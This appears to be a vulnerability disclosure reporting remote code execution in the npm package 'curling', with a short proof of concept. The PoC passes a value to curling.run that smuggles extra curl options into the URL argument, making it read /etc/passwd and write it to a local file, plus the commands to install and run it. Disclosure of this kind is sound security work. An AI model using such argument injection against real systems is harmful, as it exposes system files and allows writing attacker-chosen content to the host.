# Description

Remote Code Execution (RCE) in curling

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
const curling = require('curling');
curling.run('file:///etc/passwd -o ./out.js', function(d, payload){console.log(payload)});
```

2. Execute the following commands in terminal:

```
npm i curling # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution. And view the content in out.js
